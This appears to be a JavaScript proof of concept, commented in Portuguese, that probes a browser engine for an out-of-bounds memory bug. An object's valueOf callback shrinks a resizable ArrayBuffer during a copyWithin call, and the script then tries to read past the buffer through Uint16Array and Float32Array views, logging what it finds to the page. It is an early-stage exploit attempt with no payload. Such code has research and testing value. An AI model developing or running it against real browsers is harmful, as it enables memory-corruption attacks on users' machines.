(function() {
    function log(msg) {
        const p = document.createElement("p");
        p.textContent = msg;
        document.body.appendChild(p);
    }

    try {
        const ab = new ArrayBuffer(0x1000, { "maxByteLength": 0x10000 });
        const u8 = new Uint8Array(ab);

        log("Inicial - ab.byteLength: " + ab.byteLength);

        const call_back = function () {
            log("Callback executado. Tentando reduzir o buffer...");
            try {
                ab.resize(0);  // Tenta reduzir o buffer para 0
                log("Resize bem-sucedido.");
            } catch (e) {
                log("Erro ao tentar resize: " + e);
            }
            return 0;
        };

        // A operação de copyWithin agora tenta acessar dados fora do limite do ArrayBuffer
        u8.copyWithin(0x20, { valueOf: call_back });

        // Tentando acessar o buffer como diferentes tipos de dados
        log("Tentando acessar diferentes tipos de dados fora do buffer...");
        const u16 = new Uint16Array(ab, 0x10000, 0x10000); // Tentando acessar com Uint16Array
        const f32 = new Float32Array(ab, 0x10000, 0x10000); // Tentando acessar com Float32Array

        // Verificando se conseguimos acessar dados fora do buffer
        log("Tentando acessar dados fora do buffer...");
        for (let i = 0; i < 10; i++) {
            log(`Uint16Array [${i}]: ${u16[i]}`);
            log(`Float32Array [${i}]: ${f32[i]}`);
        }

        log("Após copyWithin - ab.byteLength: " + ab.byteLength);
    } catch (e) {
        log("Erro geral: " + e);
    }
})();
